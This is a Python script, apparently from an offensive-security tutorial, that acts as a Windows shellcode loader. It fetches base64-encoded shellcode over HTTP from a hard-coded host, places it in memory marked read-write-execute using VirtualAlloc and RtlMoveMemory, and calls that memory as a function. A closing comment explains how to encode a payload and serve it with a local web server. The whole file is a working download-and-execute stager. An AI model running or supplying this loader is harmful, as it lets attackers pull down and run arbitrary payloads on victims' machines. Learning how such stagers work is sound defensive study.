from urllib import request

import base64
import ctypes

kernel32 = ctypes.windll.kernel32


# Retrieves the base64-encoded shellcode from server.
def get_code(url):
    with request.urlopen(url) as response:
        shellcode = base64.decodebytes(response.read())
    return shellcode


# This runs after the 'run' method, meaning the shellcode is already here now.
def write_memory(buf):
    length = len(buf)

    # First we allocate memory space using "VirtualAlloc".
    kernel32.VirtualAlloc.restype = ctypes.c_void_p
    # By setting the ".argtypes", we ensure the shellcode to run on both 32 & 64 bit.
    kernel32.RtlMoveMemory.argtypes = (
        ctypes.c_void_p,
        ctypes.c_void_p,
        ctypes.c_size_t)

    # The 0x40 specifies read, write, & execute permissions otherwise the shellcode won't have any permissions.
    ptr = kernel32.VirtualAlloc(None, length, 0x3000, 0x40)
    # Lastly, move the buffer into the allocated memory using "RtlMoveMemory".
    kernel32.RtlMoveMemory(ptr, buf, length)
    return ptr


# Runs the shellcode
def run(shellcode):
    # Allocate the buffer to hold our shellcode after decoding it.
    buf = ctypes.create_string_buffer(shellcode)

    ptr = write_memory(buf)

    # Cast the buffer to act like a function pointer using "ctypes.cast".
    shell_func = ctypes.cast(ptr, ctypes.CFUNCTYPE(None))
    # Calling the function pointer will then run our shellcode as if it was a function.
    shell_func()


if __name__ == '__main__':
    url = "http://192.168.10.50:8000/my32shellcode.bin"
    shellcode = get_code(url)
    run(shellcode)

'''
    Execution and testing...
    After generating any raw payload, you must base64 encoded with the following:
    $> base64 my32shellcode.raw > my32shellcode.bin
    
    Host the file on local web server:
    $> python -m http.server 8000
'''
